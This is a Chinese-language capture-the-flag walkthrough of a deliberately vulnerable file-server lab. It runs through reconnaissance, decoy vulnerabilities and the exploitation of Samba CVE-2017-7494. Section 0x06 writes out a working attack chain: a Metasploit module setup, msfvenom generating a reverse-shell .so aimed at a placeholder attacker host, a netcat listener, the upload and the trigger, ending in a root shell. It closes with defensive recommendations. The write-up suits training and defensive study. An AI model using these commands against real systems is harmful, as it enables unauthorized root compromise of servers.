# 攻击实录：从迷雾到突破

## 0x00 前言

目标：某企业文件管理系统  
攻击者视角：黑盒测试，无任何预先知识  
目标：获取系统最高权限，找到 flag

---

## 0x01 信息收集阶段

### 1.1 端口扫描

首先对目标进行全端口扫描：

```bash
nmap -sV -p- target_ip
```

**发现开放端口：**
- 21/tcp - FTP (vsftpd 2.3.4)
- 80/tcp - HTTP (Apache 2.4.x)
- 445/tcp - microsoft-ds (?)
- 3306/tcp - MySQL
- 8080/tcp - HTTP (Tomcat?)

**心路历程：**  
哇！这么多端口开放，看起来这个系统挺复杂的。我注意到：
1. FTP 是 vsftpd 2.3.4 - 这不是那个有后门的版本吗？但是年代太久了，可能是蜜罐
2. 80 端口有 Web 服务，应该先从这里入手
3. 445 端口？Windows 共享？但系统看起来是 Linux
4. 3306 MySQL 直接暴露，有点奇怪
5. 8080 可能是管理后台

**决策：先从 Web (80) 入手，这是最常见的攻击面**

---

### 1.2 Web 应用探测

访问 `http://target_ip/`，发现一个企业文件管理系统登录页面。

页面标题：**FileHub - Enterprise File Management System**

**目录扫描：**
```bash
gobuster dir -u http://target_ip/ -w common.txt
```

发现目录：
- `/admin/` - 403 Forbidden
- `/api/` - 200 OK (空响应)
- `/backup/` - 200 OK (目录列表)
- `/debug/` - 200 OK (目录列表)
- `/temp/` - 403 Forbidden
- `/css/`, `/js/`, `/images/` - 静态资源

**心路历程：**  
有趣！`/backup/` 和 `/debug/` 目录可以访问，这通常是配置不当。让我看看里面有什么宝藏...

---

### 1.3 查看 robots.txt

```
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /debug/
Disallow: /.git/
Disallow: /temp/
```

**心路历程：**  
哈！`robots.txt` 告诉我不要访问这些目录，那我偏要看看！还有 `.git` 目录？这可能会泄露源代码！

---

### 1.4 Git 信息泄露

访问 `http://target_ip/.git/config`：

```
[core]
    repositoryformatversion = 0
    filemode = true
[remote "origin"]
    url = https://internal-git.company.com/filehub.git
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
    remote = origin
    merge = refs/heads/master
[branch "samba-migration"]
    remote = origin
    merge = refs/heads/samba-migration
```

**心路历程：**  
找到突破点了！有个分支叫 `samba-migration`，看来这个系统和 Samba 有关系。但是怎么利用呢？先继续收集信息。

---

### 1.5 查看 backup 目录

访问 `http://target_ip/backup/`，发现文件：
- `old_smb.conf` (3.2 KB)
- `database_backup_2023.sql.gz` (1.2 MB)
- `README.txt` (156 bytes)

下载 `old_smb.conf`：

```conf
# Old Samba Configuration - Migrated to v4.6.3
# Date: 2023-11-15
# DO NOT USE IN PRODUCTION

[global]
    workgroup = FILESERVER
    server string = FileHub Samba Server
    security = user

[oldshare]
    path = /mnt/old_shares
    read only = yes
```

**关键信息：Samba v4.6.3**

`README.txt` 内容：
```
Network share migration completed.
Old system decommissioned.
New SMB service running on standard port.
- IT Team
```

**心路历程：**  
Samba 4.6.3！这个版本号看起来有点眼熟...让我想想，2017年左右的版本？会不会有已知漏洞？而且提到"standard port"，那就是 445 端口！

但是我先不急着去查 Samba 漏洞，说不定 Web 应用本身就有问题，能更快拿到权限。

---

## 0x02 Web 应用测试阶段

### 2.1 登录页面测试

尝试常见用户名密码：
- `admin/admin` - 失败
- `admin/password` - 失败
- `admin/123456` - 失败

**SQL 注入测试：**
```
Username: admin' OR '1'='1
Password: anything
```

响应：`Invalid credentials` (响应时间正常，约 0.2s)

尝试时间盲注：
```
Username: admin' AND SLEEP(5)--
Password: anything
```

响应时间：约 5.3 秒！

**心路历程：**  
哈哈！存在时间盲注！但是...响应时间不太稳定，有时候4秒，有时候6秒。而且我尝试提取数据：

```
Username: admin' AND IF(SUBSTRING(database(),1,1)='f',SLEEP(5),0)--
```

无论什么条件，都会延迟。这...可能是个陷阱？SQL 注入可能是假象，开发者故意加了延迟来迷惑我。

算了，换个思路。

---

### 2.2 查看页面源代码

查看登录页面源代码，发现 HTML 注释：

```html
<!-- 
    FileHub v2.3 - Migration Notes
    - Old file system migrated to network share
    - Legacy PHP code needs refactoring
    - TODO: Remove debug endpoints before production
    - Database contains historical records
-->
```

**心路历程：**  
"network share"又提到了！"debug endpoints"还没删除，我应该去 `/debug/` 看看。

---

### 2.3 Debug 目录探测

访问 `http://target_ip/debug/`，发现：
- `info.php` - PHP 信息页面？
- `test.php` - 测试脚本？
- `logs.txt` - 日志文件？

访问 `info.php`：

```
=== System Debug Information ===
PHP Version: 7.4.33
OS: Linux fileserver 4.15.0
Server: Apache/2.4.41

Open Ports:
- 21: FTP Service
- 80: Web Service
- 445: SMB Service (Samba 4.x)
- 3306: MySQL Service
- 8080: Management Console

Services Status:
✓ Apache - Running
✓ MySQL - Running  
✓ Samba - Running (4 shares active)
✓ FTP - Running

Last System Update: 2023-11-20
```

**心路历程：**  
太棒了！确认了 SMB 服务运行在 445 端口，而且是 Samba 4.x 版本。从 backup 目录知道具体是 4.6.3。现在有4个共享，我应该去枚举一下。

但是先看看其他 debug 文件...

访问 `test.php`：
```php
<?php
// Command execution test
$cmd = $_GET['cmd'] ?? 'whoami';
$safe_cmd = escapeshellarg($cmd);
// exec("echo " . $safe_cmd, $output);
// Disabled for security
echo "Command execution disabled.";
?>
```

**心路历程：**  
开发者很谨慎，命令执行已经注释掉了。看来 Web 这条路不太好走。

---

### 2.4 尝试绕过登录

查看 `api/` 目录，发现 `api/user.php`：

```
GET /api/user.php?id=1

Response:
{
    "error": "Authentication required"
}
```

尝试 SQL 注入：
```
GET /api/user.php?id=1' UNION SELECT 1,2,3--

Response:
{
    "error": "Invalid input"
}
```

**心路历程：**  
看来所有的 SQL 输入都被过滤了，不太可能通过注入拿到数据。我已经在 Web 上花了太多时间，该换方向了。

---

## 0x03 转向 FTP 服务

### 3.1 FTP 连接测试

```bash
ftp target_ip 21
```

Banner: `220 (vsFTPd 2.3.4)`

尝试匿名登录：
```
Name: anonymous
Password: (空)
```

响应：`530 Login incorrect.`

**心路历程：**  
vsftpd 2.3.4 是著名的后门版本，用户名包含 `:)` 会触发后门。但我尝试了：

```bash
telnet target_ip 21
USER test:)
PASS anything
```

没有反应...等了30秒也没有 6200 端口开放。看来这个 FTP 是个蜜罐，浪费我时间。

---

## 0x04 MySQL 服务探测

尝试远程连接：
```bash
mysql -h target_ip -u root -p
```

响应：`ERROR 1130 (HY000): Host 'x.x.x.x' is not allowed to connect`

**心路历程：**  
MySQL 不允许远程 root 连接，这很正常。除非我已经拿到了 Web shell，否则无法利用。

---

## 0x05 深入分析 - Samba 服务

### 5.1 回顾线索

现在让我整理一下所有关于 Samba 的线索：

1. ✓ Git 配置中有 `samba-migration` 分支
2. ✓ backup 目录中的 `old_smb.conf` 提到 Samba 4.6.3
3. ✓ debug/info.php 确认 445 端口运行 Samba 4.x
4. ✓ HTML 注释提到"network share"
5. ✓ README.txt 说新 SMB 服务运行在标准端口

**所有线索都指向 Samba！**

---

### 5.2 Samba 版本漏洞搜索

搜索 "Samba 4.6.3 vulnerability"：

```
CVE-2017-7494: SambaCry - Remote Code Execution
影响版本: Samba 3.5.0 - 4.6.4
严重程度: Critical (CVSS 10.0)
```

**心路历程：**  
找到了！CVE-2017-7494，也叫 "SambaCry"，严重程度是满分10分！这是一个远程代码执行漏洞，影响 Samba 3.5.0 到 4.6.4，而目标是 4.6.3，完全在范围内！

这就是为什么前面那么多假漏洞...原来真正的攻击面在 Samba 上！

---

### 5.3 枚举 Samba 共享

```bash
smbclient -L //target_ip/ -N
```

输出：
```
Sharename       Type      Comment
---------       ----      -------
myshare         Disk      Company Internal Share
InternalBackup  Disk      IT Department Backup
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service
```

尝试访问：
```bash
smbclient //target_ip/myshare -N
```

成功！可以匿名访问。

```
smb: \> ls
  .                                   D        0  Mon Nov 20 10:30:15 2023
  ..                                  D        0  Mon Nov 20 10:30:15 2023
  welcome.txt                         N      156  Mon Nov 20 10:31:42 2023
  company_policy.pdf                  N     2048  Mon Nov 20 10:32:10 2023
  
smb: \> get welcome.txt
```

`welcome.txt` 内容：
```
Welcome to FileHub Network Share!

This share is for internal file exchange.
For sensitive data, use the InternalBackup share.

Note: System recently upgraded. 
Contact IT if you experience any issues.
```

**心路历程：**  
"recently upgraded"？如果是最近升级，那版本应该不会有漏洞啊...等等，难道升级失败了？或者说只升级了配置，但二进制文件还是旧的？

不管怎样，我已经有了可写的共享和 CVE-2017-7494 的利用代码，可以开始攻击了！

---

## 0x06 漏洞利用阶段

### 6.1 理解 CVE-2017-7494

这个漏洞的原理：
- Samba 允许客户端上传恶意 `.so` 文件到可写共享
- 然后通过特制的 RPC 调用加载这个 `.so` 文件
- 导致远程代码执行

利用条件：
1. ✓ Samba 版本在 3.5.0 - 4.6.4 之间
2. ✓ 存在可写的文件共享
3. ✓ 知道共享文件的完整路径

---

### 6.2 下载 Exploit

```bash
git clone https://github.com/joxeankoret/CVE-2017-7494.git
cd CVE-2017-7494
```

或者使用 MSF：
```bash
msfconsole
use exploit/linux/samba/is_known_pipename
set RHOST target_ip
set RPORT 445
```

---

### 6.3 生成 Payload

```bash
# 生成反弹 shell 的 .so 文件
msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST=attacker_ip \
         LPORT=4444 \
         -f elf-so \
         -o payload.so
```

---

### 6.4 上传 Payload

```bash
smbclient //target_ip/myshare -N
smb: \> put payload.so
```

---

### 6.5 触发漏洞

在本地开启监听：
```bash
nc -lvnp 4444
```

执行 exploit：
```bash
python exploit.py -t target_ip -s myshare -p /home/share/payload.so -l attacker_ip -r 4444
```

或者使用 MSF：
```bash
set RHOST target_ip
set TARGET 3  # Linux x64
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit
```

---

### 6.6 获得 Shell

```bash
[*] Started reverse TCP handler on attacker_ip:4444
[*] Connecting to target_ip:445...
[*] Uploading payload...
[*] Triggering vulnerability...
[*] Command shell session 1 opened

$ id
uid=0(root) gid=0(root) groups=0(root)

$ hostname
fileserver

$ uname -a
Linux fileserver 4.15.0-76-generic x86_64 GNU/Linux
```

**心路历程：**  
成功了！而且直接是 root 权限！Samba 通常以 root 运行，所以漏洞利用后就是最高权限。

---

## 0x07 权限维持与信息收集

### 7.1 寻找 Flag

```bash
$ find / -name "flag*" 2>/dev/null
/home/share/flag.txt
/root/final_flag.txt

$ cat /home/share/flag.txt
FLAG{5amb4_i5_n0t_ju5t_f0r_wind0w5}

$ cat /root/final_flag.txt
FINAL_FLAG{CVE-2017-7494_5ambaCry_PWN3D}

Congratulations!

You successfully identified and exploited CVE-2017-7494 (SambaCry).

Attack Path Summary:
1. Discovered multiple open services (Web, FTP, MySQL, Samba)
2. Enumerated web application and found clues in:
   - HTML comments
   - .git/config (samba-migration branch)
   - /backup/old_smb.conf (version 4.6.3)
   - /debug/info.php (confirmed SMB service)
3. Realized fake vulnerabilities (SQL injection, FTP backdoor)
4. Researched Samba 4.6.3 and found CVE-2017-7494
5. Enumerated SMB shares with smbclient
6. Uploaded malicious .so payload
7. Triggered RCE and gained root shell

Total time: ~45 minutes of focused enumeration and exploitation

Lesson learned: Not all exposed services are the real target.
```

---

## 0x08 攻击总结与反思

### 8.1 攻击时间线

| 时间 | 行动 | 结果 |
|------|------|------|
| 0-5分钟 | 端口扫描 | 发现多个服务 |
| 5-20分钟 | Web 应用测试 | 发现假漏洞、收集线索 |
| 20-25分钟 | FTP 服务测试 | 确认是蜜罐 |
| 25-30分钟 | 整理线索 | 发现所有线索指向 Samba |
| 30-35分钟 | CVE 搜索 | 找到 CVE-2017-7494 |
| 35-40分钟 | SMB 枚举 | 确认可利用条件 |
| 40-45分钟 | 漏洞利用 | 获得 root shell |

---

### 8.2 关键转折点

1. **第一次迷茫 (15分钟时)**：在 SQL 注入上浪费了时间，发现是假象后开始怀疑
2. **柳暗花明 (25分钟时)**：整理所有线索，发现都指向 Samba
3. **恍然大悟 (32分钟时)**：搜索到 CVE-2017-7494，意识到这才是真正的攻击面

---

### 8.3 迷惑性分析

靶机设计的巧妙之处：

| 迷惑点 | 真实性 | 浪费时间 |
|--------|--------|----------|
| SQL 时间盲注 | 假（故意延迟） | ~10分钟 |
| vsftpd 2.3.4 后门 | 假（蜜罐） | ~5分钟 |
| 命令执行点 | 假（已禁用） | ~3分钟 |
| MySQL 远程连接 | 真但无法利用 | ~2分钟 |

总共浪费约 20 分钟在假漏洞上，但这些假象也提供了线索！

---

### 8.4 成功的关键因素

1. ✅ **系统化信息收集**：没有漏掉任何目录和文件
2. ✅ **线索关联能力**：将分散的线索串联起来
3. ✅ **及时止损**：发现假漏洞后果断转向
4. ✅ **版本漏洞意识**：看到特定版本号立即搜索 CVE
5. ✅ **耐心**：没有在一个点上死磕，保持思路开阔

---

### 8.5 如果是真实环境

在真实渗透测试中，这个靶机给我的启示：

1. **不要忽视任何线索**：Git 配置、备份文件、注释都可能包含关键信息
2. **版本信息极其重要**：Samba 4.6.3 这个具体版本号是突破口
3. **多服务环境要全面枚举**：不要只盯着 Web
4. **假象背后可能有真相**：那些"太明显"的漏洞可能是诱饵
5. **保持文档记录**：我把所有线索记录下来，最后一串联就清楚了

---

## 0x09 防御建议

作为防御方，如何避免此类攻击：

### 9.1 立即修复
- 🔴 **升级 Samba 到 4.6.5+**：CVE-2017-7494 已修复
- 🔴 删除 debug 目录和敏感信息泄露点
- 🔴 删除 .git 目录（生产环境不应有源码）
- 🔴 删除 backup 目录或设置严格权限

### 9.2 配置加固
- 🟡 禁用 SMB 匿名访问
- 🟡 限制 SMB 共享的可写权限
- 🟡 使用防火墙限制 445 端口访问
- 🟡 修改 robots.txt，不要暴露敏感路径

### 9.3 监控告警
- 🟢 监控 SMB 异常连接和文件上传
- 🟢 监控可疑的 .so 文件
- 🟢 记录所有失败的登录尝试
- 🟢 设置入侵检测规则

---

## 0x0A 技术细节：CVE-2017-7494 深入分析

### 漏洞原理
```c
// 简化的漏洞代码路径
// source3/rpc_server/srv_pipe.c

if (is_known_pipename(pipe_name)) {
    // 加载指定路径的共享库
    handle = dlopen(client_provided_path, RTLD_NOW);
    if (handle) {
        // 执行库中的函数 - RCE!
        func = dlsym(handle, "init");
        func();
    }
}
```

### 利用流程
1. 攻击者连接到 SMB 服务
2. 上传恶意 .so 文件到可写共享
3. 发送特制的 RPC 请求，指定 pipe name
4. Samba 加载并执行恶意 .so 文件中的代码
5. 获得 Samba 进程的权限（通常是 root）

### 影响范围
- Linux/Unix Samba 3.5.0 - 4.6.4
- 全球数百万台服务器受影响
- 被称为"Linux 版永恒之蓝"

---

## 0x0B 总结

这是一个设计精巧的靶机环境：

✨ **优点**：
- 多层迷惑，模拟真实环境
- 线索链完整，逻辑合理
- 技术覆盖广（Web/DB/Network/Binary）
- 考验思维而非单纯技术

⚠️ **难点**：
- 需要抵抗假象的诱惑
- 需要系统化信息收集
- 需要线索关联能力
- 需要对历史漏洞有了解

🎯 **适用场景**：
- CTF 进阶题目
- 渗透测试培训
- 攻防演练
- 安全意识教育

---

**最终用时：约 45 分钟**  
**难度评级：★★★★☆ (4/5)**  
**推荐人群：有一定渗透测试基础的安全人员**

---

*攻击实录完成于 2024-01-XX*  
*靶机环境：CVE-2017-7494 Samba 综合渗透靶机*